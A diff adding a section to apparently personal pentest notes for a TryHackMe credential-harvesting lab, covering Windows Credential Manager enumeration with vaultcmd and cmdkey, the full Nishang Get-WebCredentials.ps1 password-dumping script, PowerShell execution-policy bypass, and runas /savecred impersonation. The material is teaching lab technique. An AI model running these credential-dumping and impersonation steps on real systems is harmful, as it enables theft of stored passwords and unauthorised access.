@@ -561,6 +561,123 @@ copy c:\Windows\System32\config\sam C:\Users\thm\Desktop\
 
 <figure><img src="../../.gitbook/assets/image (9) (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
+## Windows Credential Manager
+
+**Examples**
+
+[#windows-credential-manager](../../walkthroughs/tryhackme/credentials-harvesting.md#windows-credential-manager "mention")
+
+### Accessing Credential Manager
+
+We can access the Windows Credential Manager through GUI (Control Panel -> User Accounts -> Credential Manager) or the command prompt. In this task, the focus will be more on the command prompt scenario where the GUI is not available.
+
+<figure><img src="../../.gitbook/assets/image (7) (10).png" alt=""><figcaption></figcaption></figure>
+
+We will be using the Microsoft Credentials Manager `vaultcmd` utility. Let's start to enumerate if there are any stored credentials. First, we list the current windows vaults available in the Windows target.&#x20;
+
+**Victim(cmd)**
+
+```
+vaultcmd /list
+```
+
+<figure><img src="../../.gitbook/assets/image (119) (1).png" alt=""><figcaption></figcaption></figure>
+
+By default, Windows has two vaults, one for Web and the other one for Windows machine credentials. The above output confirms that we have the two default vaults.
+
+Let's check if there are any stored credentials in the Web Credentials vault by running the vaultcmd command with `/listproperties`.
+
+**Victim(cmd)**
+
+```
+VaultCmd /listproperties:"Web Credentials"
+```
+
+<figure><img src="../../.gitbook/assets/image (118) (1).png" alt=""><figcaption></figcaption></figure>
+
+The output shows that we have one stored credential in the specified vault. Now let's try to list more information about the stored credential as follows,
+
+**Victim(cmd)**
+
+```
+VaultCmd /listcreds:"Web Credentials"
+```
+
+<figure><img src="../../.gitbook/assets/image (35) (3).png" alt=""><figcaption></figcaption></figure>
+
+### Credential Dumping
+
+The VaultCmd is not able to show the password, but we can rely on other PowerShell Scripts such as Get-WebCredentials.ps1, which is already included in the attached VM.
+
+**Get-WebCredentials.ps1**
+
+```
+function Get-WebCredentials
+{
+<#
+.SYNOPSIS
+Nishang script to retrieve web credentials from Windows vault (requires PowerShell v3 and above)
+
+.DESCRIPTION
+This script can be used to retreive web credentiaks stored in Windows Valut from Windows 8 onwards. The script 
+also needs PowerShell v3 onwards and must be run from an elevated shell.
+
+.EXAMPLE
+PS > Get-WebCredentials
+
+.LINK
+https://github.com/samratashok/nishang
+#>
+[CmdletBinding()] Param ()
+
+
+#http://stackoverflow.com/questions/9221245/how-do-i-store-and-retrieve-credentials-from-the-windows-vault-credential-manage
+$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+$VaultObj = new-object Windows.Security.Credentials.PasswordVault
+$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }
+}
+```
+
+Ensure to execute PowerShell with bypass policy to import it as a module as follows,
+
+**Victim(cmd)**
+
+```
+powershell -ex bypass
+Import-Module C:\Tools\Get-WebCredentials.ps1
+Get-WebCredentials
+```
+
+<figure><img src="../../.gitbook/assets/image (15) (9).png" alt=""><figcaption></figcaption></figure>
+
+The output shows that we obtained the username and password for accessing the internal application.
+
+### RunAs
+
+An alternative method of taking advantage of stored credentials is by using RunAs. RunAs is a command-line built-in tool that allows running Windows applications or tools under different users' permissions. The RunAs tool has various command arguments that could be used in the Windows system. The `/savecred` argument allows you to save the credentials of the user in Windows Credentials Manager (under the Windows Credentials section). So, the next time we execute as the same user, runas will not ask for a password.
+
+Let's apply it to the attached Windows machine. Another way to enumerate stored credentials is by using `cmdkey`, which is a tool to create, delete, and display stored Windows credentials. By providing the `/list` argument, we can show all stored credentials, or we can specify the credential to display more details `/list:computername`.
+
+**Victim(cmd)**
+
+```
+cmdkey /list
+```
+
+The output shows that we have a domain password stored as the `thm\thm-local` user. Note that stored credentials could be for other servers too. Now let's use runas to execute Windows applications as the `thm-local` user.&#x20;
+
+<figure><img src="../../.gitbook/assets/image (116) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(cmd)**
+
+```
+runas /savecred /user:THM.red\thm-local cmd.exe
+```
+
+<figure><img src="../../.gitbook/assets/image (36) (4).png" alt=""><figcaption></figcaption></figure>
+
+A new cmd.exe pops up with a command prompt ready to use. Now run the whoami command to confirm that we are running under the desired user. There is a flag in the c:\Users\thm-local\Saved Games\flag.txt, try to read it and answer the question below.
+
 ### Metasploit's HashDump
 
 **Examples**
